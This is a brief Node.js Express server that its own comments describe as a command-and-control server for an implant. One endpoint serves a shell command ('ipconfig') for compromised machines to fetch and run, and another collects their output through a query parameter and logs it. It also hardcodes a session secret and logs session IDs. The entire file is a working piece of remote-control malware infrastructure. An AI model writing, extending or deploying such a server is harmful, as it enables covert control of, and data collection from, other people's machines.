const express = require('express')
const hostname = '172.31.18.80';
const port = 443;
var session = require('express-session');

const app = express();

var command = "ipconfig";

app.use(session({
	secret: "keyboardCat",
	resave: false,
	saveUninitialized: true
}));

app.get('/', (req, res) => {
	res.send('Hello World');
	sid = req.sessionID;
	console.log(sid);
});



//Used to return the output from the target machine to our C2 server
app.get('/info', (request, response) => {
    if(request.query.info != null){
        var InfoText = request.query.info;
        //InfoText = decodeURI(InfoText);
        console.log(InfoText)
    }
    response.send("Information Sent!")
});

//Used to send out command to the server to be read by the implant
app.get('/retrcommand', (request, response) => {
    response.send(command)

});

app.listen(port, hostname);